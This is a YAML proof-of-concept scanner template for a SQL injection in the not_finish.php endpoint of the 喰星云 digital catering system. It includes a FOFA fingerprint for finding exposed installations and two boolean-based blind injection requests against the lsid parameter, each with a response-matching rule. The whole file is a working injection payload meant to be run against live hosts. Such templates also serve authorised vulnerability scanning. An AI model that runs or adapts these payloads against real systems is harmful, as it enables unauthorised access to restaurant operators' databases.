id: poc-yaml-can-xing-yun-not-finish-php-sqli
info:
  name: 喰星云-数字化餐饮服务系统 not_finish.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 喰星云-数字化餐饮服务系统
  fofa: body="tmp_md5_pwd"
requests:
- method: GET
  path: /logistics/home_warning/php/not_finish.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6193=6193)+THEN+''+ELSE+(SELECT+9641+UNION+SELECT+2384)+END))
  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":true\") &&\n\
    contains(body,\"\\\"total\\\":\") &&\n!contains(body,\"<\")\n"
- method: GET
  path: /logistics/home_warning/php/not_finish.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6192=6193)+THEN+''+ELSE+(SELECT+9641+UNION+SELECT+2384)+END))
  expression: "status_code == 200 && \n(\n(contains(body,\"数据库查询出错\") && contains(body,\"\
    DBException\"))\n||\n(contains(body,\"\\\"success\\\":false\") && contains(body,\"\
    服务器内部错误\"))\n)\n"
variables: {}
transport: http
